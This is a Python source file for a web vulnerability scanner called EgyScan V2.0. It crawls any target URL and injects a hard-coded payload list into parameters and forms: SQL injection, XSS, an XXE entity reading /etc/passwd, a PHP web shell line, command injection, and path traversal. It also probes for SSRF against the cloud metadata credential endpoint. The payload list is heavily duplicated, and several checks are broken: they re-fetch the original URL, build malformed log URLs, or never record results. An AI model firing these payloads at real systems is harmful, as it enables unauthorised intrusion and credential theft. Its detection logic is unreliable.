import time
import logging
import tqdm
import warnings
import random
import re
import urllib3
import signal
import requests
import sys
import os
import concurrent.futures
import threading
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from itertools import islice
from urllib.robotparser import RobotFileParser
from bs4 import MarkupResemblesLocatorWarning

warnings.filterwarnings("ignore")
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # Add more user agents if desired
]
session = requests.Session()
session.verify = True  # Enable SSL certificate verification
session.headers = {
    "User-Agent": random.choice(USER_AGENTS),
}
payloads = [
    "'; SELECT * FROM users; --",
    "<script>alert('XSS')</script>",
    "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
    "malicious_payload.php",
    "admin' OR '1'='1",
    "../../../../etc/passwd%00",
    "<img src=x onerror=alert('XSS')>",
    "<?php system($_GET['cmd']); ?>",
    "../../../../etc/passwd",
    "evil_script.js",
    ";ls",
    "ls",
    "admin.php",
    "robots.txt",
    "adminer.php",
    "phpmyadmin",
    "dbadmin",
    ".env",
    "config.php",
    "config.yaml",
    "application.properties",
    ".git/config",
    ".svn/entries",
    ".DS_Store",
    "backup.zip",
    "backup.tar.gz",
    "database.bak",
    "database.sql",
    "config.bak",
    "config.zip",
    ".git",
    ".svn",
    ".htaccess",
    ".htpasswd",
    "secure",
    "secret",
    "confidential",
    "api_key",
    "secret_key",
    "private_key",
    "credentials",
    "password",
    "credit_card",
    "session",
    "log",
    "error.log",
    "access.log",
    "debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "robots.txt",
    "backup.zip",
    "backup.tar.gz",
    "database.bak",
    "database.sql",
    "config.bak",
    "config.zip",
    ".git",
    ".svn",
    ".htaccess",
    ".htpasswd",
    "secure",
    "secret",
    "confidential",
    "api_key",
    "secret_key",
    "private_key",
    "credentials",
    "password",
    "credit_card",
    "session",
    "log",
    "error.log",
    "access.log",
    "debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "robots.txt",
    "backup.zip",
    "backup.tar.gz",
    "database.bak",
    "database.sql",
    "config.bak",
    "config.zip",
    ".git",
    ".svn",
    ".htaccess",
    ".htpasswd",
    "secure",
    "secret",
    "confidential",
    "api_key",
    "secret_key",
    "private_key",
    "credentials",
    "password",
    "credit_card",
    "session",
    "log",
    "error.log",
    "access.log",
    "debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
    "logs/app.log",
    "logs/error.log",
    "logs/access.log",
    "logs/debug.log",
]

ALLOWED_HOSTS = ["www.google.com"]

logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")

def print_logo():
    logo = """
    ███████╗██╗   ██╗██████╗ ███████╗██████╗  █████╗ ██████╗ ██╗     ███████╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║██████╔╝██║     █████╗  
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██╗██║     ██╔══╝  
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██████╔╝███████╗███████╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
    """
    print(logo)
    glow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    interval = 0.5  # Time interval between color changes (in seconds)

    for color in glow_colors:
        print(color + logo)
        time.sleep(interval)


MAX_WORKERS = 20


def check_sqli(url):
    try:
        response = requests.get(url)
        response.raise_for_status() 
        response_text = response.content.decode('utf-8')

        # Add more detection patterns or use regular expressions for comprehensive detection
        patterns = [
            r"You have an error in your SQL syntax",
            r"mysql_fetch_array",
            r"/var/www",
            r"on line",
            r"Trying to access array offset on value of type",
            r"at line"
            r"your MySQL server version"
            r"the right syntax to"
        ]

        for pattern in patterns:
            if re.search(pattern, response_text):
                return True

    except (requests.RequestException, UnicodeDecodeError):
        pass  

    return False
def check_rce(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for non-2xx status codes

        # Add more detection patterns or modify the existing one for comprehensive detection
        detection_pattern = "root:"

        if detection_pattern in response.text:
            return True

    except (requests.RequestException, UnicodeDecodeError):
        pass  # Handle the exception or log it if needed

    return False



def check_xss(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for non-2xx status codes

        # Add more detection patterns or modify the existing one for comprehensive detection
        detection_pattern = "XSS"

        if detection_pattern in response.text:
            return True

    except (requests.RequestException, UnicodeDecodeError):
        pass  # Handle the exception or log it if needed

    return False


def check_lfi(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for non-2xx status codes

        # Add more detection patterns or modify the existing one for comprehensive detection
        detection_pattern = "root:"

        if detection_pattern in response.text:
            return True

    except (requests.RequestException, UnicodeDecodeError):
        pass  # Handle the exception or log it if needed

    return False


def check_open_redirect(url):
    payload = "http://www.google.com"
    sanitized_url = urljoin(url, payload)
    parsed_url = urlparse(sanitized_url)

    if parsed_url.netloc in ALLOWED_HOSTS:
        response = requests.get(sanitized_url)
        if response.status_code == 302 and urlparse(response.url).netloc == "www.google.com":
            return True

    return False

def check_backup_files(url):
    extensions = [".bak", ".zip", ".tgz", ".sql"]
    parsed_url = urlparse(url)

    for extension in extensions:
        backup_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{parsed_url.path}{extension}"
        if extension in parsed_url.path:
            response = requests.get(backup_url)
            if response.status_code == 200:
                return True

    return False


def check_database_exposure(url):
    endpoints = ["phpmyadmin", "adminer", "dbadmin"]
    for endpoint in endpoints:
        response = requests.get(url + "/" + endpoint)
        if response.status_code == 302:
            return True
    return False


def check_directory_listings(url):
    response = requests.get(url)
    if response.status_code == 200 and "Index of" in response.text:
        return True
    return False


def check_sensitive_information(url):
    keywords = ["private_key", "creditcard", "api_key", "secret_key"]
    response = requests.get(url)
    for keyword in keywords:
        if keyword in response.text:
            return True
    return False
    
def check_log_files(url):
    log_files = ["access.log", "error.log", "log.log"]
    parsed_url = urlparse(url)

    for log_file in log_files:
        log_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{log_files}"
        response = requests.get(log_url)
        if response.status_code == 200 and "log content" in response.text:
            return True

    return False
    
def check_xxe(url):
    payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
    response = requests.post(url, data=payload)
    if response.status_code == 200 and "root:" in response.text:
        return True
    return False

def check_ssrf(url):
    payload = "/http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
    response = requests.get(url + "?url=" + payload)
    if response.status_code == 200 and "AccessDenied" in response.text:
        return True
    return False

def check_rfi(url):
    payload = "/https://raw.githubusercontent.com/dragonked2/Egyscan/main/README.md"
    response = requests.get(url + payload)
    if response.status_code == 200 and "EgyScan V2.0" in response.text:
        return True
    return False


session = requests.Session()
session.verify = True  # Skip SSL verification
session.headers = {
    "User-Agent": random.choice(USER_AGENTS),
}


def collect_urls(target_url, num_threads=5):
    parsed_target_url = urlparse(target_url)
    target_domain = parsed_target_url.netloc

    urls = set()
    processed_urls = set()
    urls.add(target_url)

    processed_urls_lock = threading.Lock()  # Added lock for thread safety

    def extract_urls_from_html(html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        extracted_urls = set()
        for link in soup.find_all('a', href=True):
            url = link['href']
            absolute_url = urljoin(base_url, url)
            extracted_urls.add(absolute_url)
        return extracted_urls

    def filter_urls(urls, target_domain, processed_urls):
        filtered_urls = set()
        for url in urls:
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            if domain == target_domain or domain.endswith("." + target_domain):
                if url not in processed_urls:
                    filtered_urls.add(url)
        return filtered_urls

    def process_url(current_url):
        nonlocal urls, processed_urls
        try:
            if current_url.startswith("javascript:"):
                return set()  # Skip JavaScript URLs

            response = requests.get(current_url)  # Enable SSL certificate verification by removing 'verify=False'
            if response.status_code == 200:
                extracted_urls = extract_urls_from_html(response.text, current_url)
                filtered_urls = filter_urls(extracted_urls, target_domain, processed_urls)

                with processed_urls_lock:  # Use a lock to ensure thread safety when updating the set
                    processed_urls.update(filtered_urls)

                urls.update(filtered_urls)
        except requests.exceptions.RequestException as e:
            logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
        except Exception as e:
            logging.error(f"Error occurred for URL: {current_url}, Error: {e}")

        return set()

    with tqdm.tqdm(total=len(urls), desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            while urls:
                current_urls = list(urls)  # Convert set to a list for concurrent processing
                urls.clear()

                futures = [executor.submit(process_url, url) for url in current_urls]
                for future in concurrent.futures.as_completed(futures):
                    try:
                        filtered_urls = future.result()
                        urls.update(filtered_urls)
                    except Exception as e:
                        logging.error(f"Error occurred while processing URL: {e}")

                pbar.total = len(urls) + len(processed_urls)
                pbar.update(len(current_urls))

    return processed_urls
  
def scan_and_inject_payloads(url):
    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    params = parse_qs(parsed_url.query)

    processed_parameters = set()
    for param in params:
        if param in processed_parameters:
            continue

        processed_parameters.add(param)

        for payload in payloads:
            injected_params = params.copy()
            param_values = injected_params.get(param)
            if param_values is not None:
                for i in range(len(param_values)):
                    param_values[i] += payload

                injected_url = url.split("?")[0] + "?" + "&".join(
                    f"{key}={value}" for key, value in injected_params.items()
                )
                response = requests.get(injected_url)
                scan_response(response)

    response = requests.get(url)
    scan_response(response)

    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        form_action = form.get("action")
        if form_action:
            if not form_action.startswith("http"):
                form_action = urljoin(base_url, form_action)

            form_inputs = form.find_all(["input", "textarea"])
            form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}

            processed_fields = set()
            for field in form_data:
                if field in processed_fields:
                    continue

                processed_fields.add(field)

                for payload in payloads:
                    injected_fields = form_data.copy()
                    field_value = injected_fields.get(field)
                    if field_value is not None:
                        injected_fields[field] = field_value + payload
                        response = requests.post(form_action, data=injected_fields)
                        scan_response(response)

def scan_response(response):
    if check_sqli(response.url):
        logging.warning(f"SQLI: {response.url}")
    if check_rce(response.url):
        logging.warning(f"RCE: {response.url}")
    if check_xss(response.url):
        logging.warning(f"XSS: {response.url}")
    if check_lfi(response.url):
        logging.warning(f"LFI: {response.url}")
    if check_open_redirect(response.url):
        logging.warning(f"Open Redirect: {response.url}")
    if check_backup_files(response.url):
        logging.warning(f"Backup Files: {response.url}")
    if check_database_exposure(response.url):
        logging.warning(f"Database Exposure: {response.url}")
    if check_directory_listings(response.url):
        logging.warning(f"Directory Listings: {response.url}")
    if check_sensitive_information(response.url):
        logging.warning(f"Sensitive Information: {response.url}")
    if check_xxe(response.url):
        logging.warning(f"XXE: {response.url}")
    if check_ssrf(response.url):
        logging.warning(f"SSRF: {response.url}")
    if check_rfi(response.url):
        logging.warning(f"RFI: {response.url}")
    if check_log_files(response.url):
        logging.warning(f"Log File Disclosure: {response.url}")


def print_colorful(message, color=Fore.GREEN):
    print(color + message + Style.RESET_ALL)

def print_warning(message):
    print(Fore.YELLOW + "Bingo: " + message + Style.RESET_ALL)

def print_error(message):
    print(Fore.RED + "Error: " + message + Style.RESET_ALL)

def print_info(message):
    print(Fore.BLUE + "Info: " + message + Style.RESET_ALL)


def save_vulnerable_urls(vulnerable_urls):
    with open("vulnerable_urls.txt", "w") as file:
        for url in vulnerable_urls:
            file.write(url + "\n")

def main():
    print_logo()
    print(f"EgyScan V2.0\nhttps://github.com/dragonked2/Egyscan")

    target_url = input("Enter the target URL to scan for vulnerabilities: ")

    # Validate and modify the target URL if necessary
    parsed_url = urlparse(target_url)
    if not parsed_url.scheme:
        target_url = "http://" + target_url

    session = requests.Session()
    session.verify = True  # Skip SSL verification
    session.headers = {
        "User-Agent": random.choice(USER_AGENTS),
    }

    print_info("Collecting URLs from the target website...")
    urls = collect_urls(target_url)

    print(f"Found {len(urls)} URLs to scan.")

    print_info("Scanning collected URLs for vulnerabilities...")
    pbar = tqdm.tqdm(total=len(urls), desc="Scanning URLs", unit="URL")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(scan_and_inject_payloads, url) for url in urls]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error occurred while scanning URL: {e}")
            pbar.update(1)

    pbar.close()
    logging.info("Scanning completed!")

    # Store vulnerable URLs
    vulnerable_urls = set()

    def signal_handler(signal, frame):
        print("\nScan interrupted. Saving vulnerable URLs to 'vulnerable_urls.txt'...")
        save_vulnerable_urls(vulnerable_urls)
        print("Vulnerable URLs saved successfully.")
        exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        for url in urls:
            scan_and_inject_payloads(url)

        # Scanning completed
        print_info("Scanning completed!")

        # Save vulnerable URLs
        save_vulnerable_urls(vulnerable_urls)

        print("Vulnerable URLs saved to 'vulnerable_urls.txt'.")

    except Exception as e:
        logging.error(f"Error occurred during scanning: {e}")
        # Save vulnerable URLs in case of an error
        save_vulnerable_urls(vulnerable_urls)
        print("An error occurred during scanning. Vulnerable URLs saved to 'vulnerable_urls.txt'.")

if __name__ == "__main__":
    main()
